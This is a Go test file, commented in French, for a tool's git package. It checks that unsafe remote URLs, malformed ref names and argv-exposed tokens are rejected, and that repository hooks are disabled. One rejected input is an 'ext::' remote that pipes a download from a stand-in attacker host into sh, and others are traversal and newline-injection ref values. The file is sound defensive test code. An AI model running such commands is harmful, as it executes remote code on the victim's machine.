// Étage 1 de l'ADR-0010 : validation d'entrées, sans réseau ni serveur.

package git

import (
	"strings"
	"testing"
)

// TestParseRemoteRefuseLesTransportsExecutables est un test de sécurité, pas de
// robustesse.
//
// Une URL de remote git n'est pas seulement une adresse : `ext::` prend une
// commande shell et l'exécute. Cette URL vient de la configuration projet
// (§5.4), donc d'un fichier versionné dans un dépôt — une entrée non fiable au
// sens du §2. L'accepter ferait de `warden run` un exécuteur de commandes
// arbitraires déclenché par le contenu du dépôt audité.
func TestParseRemoteRefuseLesTransportsExecutables(t *testing.T) {
	refus := []string{
		"ext::sh -c 'curl attaquant.invalid | sh'",
		"ssh://git@exemple.invalid/depot.git",
		"git://exemple.invalid/depot.git",
		"file:///tmp/depot.git",
		"/tmp/depot.git",
		"https://alice:motdepasse@exemple.invalid/d.git", // credentials en argv
		"https:///sans-hote",
		"",
	}
	for _, brut := range refus {
		if _, err := ParseRemote(brut); err == nil {
			t.Errorf("ParseRemote(%q) accepté", brut)
		}
	}

	for _, ok := range []string{
		"https://warden.exemple.invalid/git",
		"http://localhost:8080/git",
	} {
		if _, err := ParseRemote(ok); err != nil {
			t.Errorf("ParseRemote(%q): %v", ok, err)
		}
	}
}

// TestNewRefApplique les règles de check-ref-format.
//
// La version précédente acceptait tout ce qui commençait par « r » et faisait
// cinq caractères. Ces valeurs finissent dans l'argv d'un git push et dans un
// chemin sur le serveur.
func TestNewRefApplique(t *testing.T) {
	valides := []string{
		"refs/audit/alice/01JZQ0000000000000000P0001",
		"refs/heads/principale",
		"refs/namespaces/runs/01JZQ/refs/heads/run",
	}
	for _, r := range valides {
		if _, err := NewRef(r); err != nil {
			t.Errorf("NewRef(%q): %v", r, err)
		}
	}

	refus := map[string]string{
		"hors de refs/":         "heads/principale",
		"vide":                  "",
		"remontée":              "refs/audit/../heads/principale",
		"espace":                "refs/audit/a b",
		"caractère de révision": "refs/audit/a^b",
		"joker":                 "refs/audit/a*",
		"deux-points":           "refs/audit/a:b",
		"antislash":             "refs/audit/a\\b",
		"reflog":                "refs/audit/a@{1}",
		"composant vide":        "refs/audit//a",
		"terminaison lock":      "refs/audit/a.lock",
		"point final":           "refs/audit/a.",
		"barre finale":          "refs/audit/a/",
		"composant caché":       "refs/audit/.a",
		"saut de ligne":         "refs/audit/a\nb",
	}
	for nom, r := range refus {
		t.Run(nom, func(t *testing.T) {
			if _, err := NewRef(r); err == nil {
				t.Errorf("NewRef(%q) accepté", r)
			}
		})
	}
}

// TestWithAuthNeMetPasLeJetonDansArgv : sur un poste de développement,
// « n'importe quel utilisateur de la machine » n'est pas une hypothèse — et une
// ligne de commande est lisible par tous via /proc.
func TestWithAuthNeMetPasLeJetonDansArgv(t *testing.T) {
	const jeton = "jeton-secret-de-test"

	cmd := New("").WithAuth(jeton).command(t.Context(), "version")

	for _, arg := range cmd.Args {
		if strings.Contains(arg, jeton) {
			t.Fatalf("jeton présent dans argv: %v", cmd.Args)
		}
	}

	var trouve bool
	for _, e := range cmd.Env {
		if strings.Contains(e, jeton) {
			trouve = true
		}
	}
	if !trouve {
		t.Error("jeton absent de l'environnement: l'authentification ne partirait pas")
	}
}

// TestCommandNeutraliseLesHooks : neutraliser GIT_CONFIG_GLOBAL et
// GIT_CONFIG_SYSTEM ne suffit pas, le `.git/config` du dépôt reste lu. Or
// core.hooksPath et core.fsmonitor y désignent des programmes que git lance
// pour nous, y compris sur les commandes en lecture seule.
func TestCommandNeutraliseLesHooks(t *testing.T) {
	args := strings.Join(New("").command(t.Context(), "status").Args, " ")

	for _, attendu := range []string{"core.hooksPath=/dev/null", "core.fsmonitor=false"} {
		if !strings.Contains(args, attendu) {
			t.Errorf("%s absent de la ligne de commande: %s", attendu, args)
		}
	}
}
